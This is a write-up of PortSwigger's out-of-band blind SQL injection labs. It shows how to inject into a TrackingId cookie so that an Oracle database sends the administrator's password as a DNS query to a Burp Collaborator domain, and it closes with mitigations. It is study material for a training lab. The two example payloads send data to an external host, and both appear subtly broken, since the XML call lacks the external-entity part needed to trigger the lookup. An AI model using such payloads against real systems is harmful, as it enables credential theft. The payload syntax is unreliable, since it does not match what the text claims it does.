# 🧪 Lab 16 & 17: Blind SQL Injection with Out-of-Band (OOB) Data Exfiltration Solution

**PortSwigger Lab Link:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

**Table of Contents:**
* 1. Lab Description & Goal
* 2. Vulnerability: OOB Oracle & DNS Channel
* 3. Lab 16: Step-by-Step Confirmation (Base OOB)
* 4. Lab 17: Step-by-Step Data Exfiltration
* 5. Key Learnings/Concepts
* 6. Mitigation

---

## 1. Lab Description & Goal

This solution covers the full **Out-of-Band (OOB) Blind SQL Injection** process. OOB is used when standard output channels (page content, errors, time) are blocked.

* **Goal:** Dump the administrator's password by forcing the database to send the password as a **DNS query** to a server controlled by the attacker (e.g., **Burp Collaborator**).
* **Vulnerability Location:** The injection point is the **`TrackingId` cookie**.
* **The Oracle:** The attacker's **Burp Collaborator logs** (or Interactsh).

## 2. Vulnerability: OOB Oracle & DNS Channel

OOB attacks rely on database functions that can initiate external network requests. The most common method is **DNS exfiltration**.

* **Mechanism:** We inject a query using a function like `EXTRACTVALUE` or `UTL_HTTP` (database dependent) to combine the sensitive data with a **unique Collaborator domain**. The database attempts to resolve this massive, custom subdomain, and the entire string (including the password) appears in the Collaborator's DNS query logs.
* **Key Tool:** **Burp Collaborator** is used to generate the unique domain and log the incoming DNS requests.

## 3. Lab 16: Step-by-Step Confirmation (Base OOB)

This step confirms the OOB channel is open by forcing a simple DNS lookup.

### A. Setup and Injection

1.  **Open Collaborator:** Start the **Burp Collaborator Client** and copy its unique domain (e.g., `xyz123.burpcollaborator.net`).
2.  **Intercept:** Send the vulnerable request (with the `TrackingId` cookie) to **Repeater**.
3.  **Injection:** Inject a basic DNS lookup payload into the `TrackingId` cookie to test connectivity (e.g., using `DBMS_LDAP` or similar Oracle/MySQL functions that force a DNS lookup).

### B. Verification

1.  Send the request from Repeater.
2.  Go to the Collaborator client and **Poll Now**.
3.  **Result:** If a **DNS query** from the lab's server IP appears, the OOB channel is open.

## 4. Lab 17: Step-by-Step Data Exfiltration

This step forces the database to send the administrator's password as a DNS lookup.

### A. Data Retrieval Strategy

To send the password, we must embed a **sub-query** (`SELECT password FROM users...`) within the external network function.

### B. Final Exfiltration Payload

The payload often uses `EXTRACTVALUE` (or similar function) combined with the concatenation operator (`||`) to build the massive, data-carrying subdomain.

1.  **Prepare the Payload:** Concatenate the result of the password query with your Collaborator domain.
    * **Inner Query (The data we want):** `(SELECT password FROM users WHERE username='administrator')`
    * **Full Injection Structure (Example):**
      ```sql
      ' UNION SELECT EXTRACTVALUE(XMLType('//a'), '//' || (SELECT password FROM users WHERE username='administrator') || '.xyz123.burpcollaborator.net') FROM dual--
      ```
    * *The notes provide a similar, slightly simplified structure:*
      ```sql
      ' || (SELECT EXTRACTVALUE(XMLType('//a'), '//' || (SELECT password FROM users WHERE username='administrator') || '.xyz123.burpcollaborator.net') FROM dual) || '
      ```
    * The single quotes around the entire injection (`' || ... || '`) ensure the payload is correctly injected into the initial `TrackingId` string.

2.  **Inject and Send:** Insert the final payload (with your new Collaborator domain) into the `TrackingId` cookie and send the request from Repeater.

3.  **Extract Password:** Go to the Collaborator client and **Poll Now**.
    * **Successful Result:** The Collaborator logs will show a DNS lookup containing the administrator's password as the subdomain (e.g., `extractedpassword.xyz123.burpcollaborator.net`).
    * **Solve:** Copy the password and log in.

## 5. Key Learnings/Concepts

* **OOB Exfiltration:** The ability to leak data out of the application environment entirely via external network protocols (DNS or HTTP).
* **The Power of Subdomains:** Data is encoded in the DNS query string. If the password is `SECRET`, the database attempts to resolve `SECRET.collaborator.net`.
* **Database Functions:** This attack relies on functions that can execute external calls (e.g., `UTL_HTTP`, `DBMS_LDAP`, or `EXTRACTVALUE` coupled with network requests in certain contexts).
* **Final Oracle:** The external system's logs are the final source of truth for the successful data leak.
    
## 6. Mitigation

1.  **Network Egress Filtering:** **This is the critical defense.** Restrict the database server's ability to initiate *any* outbound network connections (DNS, HTTP, etc.) to domains outside of the trusted internal network.
2.  **Parameterized Queries:** Prevents the injection of the malicious `EXTRACTVALUE` and sub-query logic.
3.  **Principle of Least Privilege:** Configure the database user to explicitly deny execution of any network-related functions (`DBMS_LDAP`, `UTL_HTTP`, etc.) that could be used for OOB communication.
